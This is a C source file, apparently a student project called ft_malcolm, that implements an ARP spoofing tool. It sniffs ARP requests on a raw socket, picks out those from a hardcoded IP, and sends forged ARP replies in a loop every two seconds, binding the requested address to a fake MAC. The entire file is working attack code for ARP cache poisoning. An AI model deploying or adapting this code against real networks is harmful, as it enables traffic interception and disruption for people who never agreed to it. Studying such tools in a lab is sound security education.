#include "../headers/malcolm.h"

int send_back(int sockfd, struct sockaddr_ll src_addr,
	struct ethernet_hdr *ethernet, struct arp_hdr *arp)
{
	int ret;
	socklen_t addr_len = sizeof(struct sockaddr_ll);
	struct arp_packet packet = {0};

	uint8_t dest_mac[ETH_ADDR_LEN] = {0x66, 0x66, 0x66, 0x66, 0x66, 0x66};
	uint8_t tmp_ip[IP_ADDR_LEN] = {0};

	/* Fill the new packet */
	packet.ethernet = *ethernet;
	packet.arp = *arp;
	/* Set the ARP opcode to reply */
	packet.arp.op = ft_htons(ARP_REPLY);

	/* Changing MAC addresses */
	ft_memcpy(packet.ethernet.dmac, packet.ethernet.smac, ETH_ADDR_LEN);
	ft_memcpy(packet.ethernet.smac, dest_mac, sizeof(packet.ethernet.smac));
	ft_memcpy(packet.arp.tha, packet.arp.sha, sizeof(packet.arp.sha));
	ft_memcpy(packet.arp.sha, dest_mac, sizeof(packet.arp.sha));

	/* Swapping IP addresses */
	ft_memcpy(tmp_ip, packet.arp.sip, sizeof(packet.arp.sip));
	ft_memcpy(packet.arp.sip, packet.arp.tip, sizeof(packet.arp.sip));
	ft_memcpy(packet.arp.tip, tmp_ip, sizeof(packet.arp.sip));

	ret = sendto(sockfd, &packet, sizeof(struct arp_packet), 0,
		(struct sockaddr *)&src_addr, addr_len);

	if (ret == -1) {
		fprintf(stderr, "[!] Failed to send arp reply to ");
		print_ip(STDERR_FILENO, packet.arp.tip);
		fprintf(stderr, "\n");
		return -1;
	}

	// printf("Wrote: %d bytes in socket\n", ret);
	// debug_packet(&packet.ethernet, &packet.arp);

	return 0;
}

int filter_out(uint8_t *ip)
{
	/* TODO: Must take this IP from arg list (MAC address too) */
	uint8_t target_ip[IP_ADDR_LEN] = {172, 17, 0, 2};

	int i = 0;
	while (i < IP_ADDR_LEN) {
		if (target_ip[i] != ip[i])
			return 1;
		i++;
	}

	return 0;
}

int handle_packet(int sockfd, struct sockaddr_ll src_addr, char *buffer)
{
	struct arp_hdr *arp;
	struct ethernet_hdr *ethernet;
	uint16_t type;
	uint16_t opcode;
	struct timespec wait = {2, 0}; /* 2 seconds */

	ethernet = (struct ethernet_hdr *)buffer;
	arp = (struct arp_hdr *)(buffer + sizeof(struct ethernet_hdr));

	type = ft_ntohs(ethernet->type);
	/* TODO: Check if an OPCODE check is needed */
	opcode = ft_ntohs(arp->op);

	if (type == ETH_P_ARP && opcode == ARP_REQUEST &&
		!filter_out(arp->sip)) {
		debug_packet(ethernet, arp);
		while (1) {
			printf("Spoofing\n");
			if (send_back(sockfd, src_addr, ethernet, arp) != 0)
				break;
			clock_nanosleep(CLOCK_REALTIME, 0, &wait, NULL);
		}
		return 1;
	}
	else {
		printf("Filtering request from: ");
		print_ip(STDOUT_FILENO, arp->sip);
	}
	return 0;
}

int ft_malcolm(void)
{
	int sockfd;
	int len = sizeof(struct ethernet_hdr) + sizeof(struct arp_hdr);
	char buffer[len];
	int ret;
	struct sockaddr_ll src_addr;
	socklen_t addr_len = sizeof(struct sockaddr_ll);

	/* Socket creation */
	if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
		fprintf(stderr, "[!] Failed to create socket\n");
		return 1;
	}

	printf("Sniffing ARP packets...\n");
	while ((ret = recvfrom(sockfd, buffer, len, 0,
			(struct sockaddr *)&src_addr, &addr_len)) != -1)
	{
		if (ret > 0 && handle_packet(sockfd, src_addr, buffer))
			break ;
	}

	close(sockfd);

	return 0;
}

int main(int ac, char **av)
{
	if (parse_option_line(ac, av)) {
		return -1;
	}
	ft_malcolm();
	return 0;
}
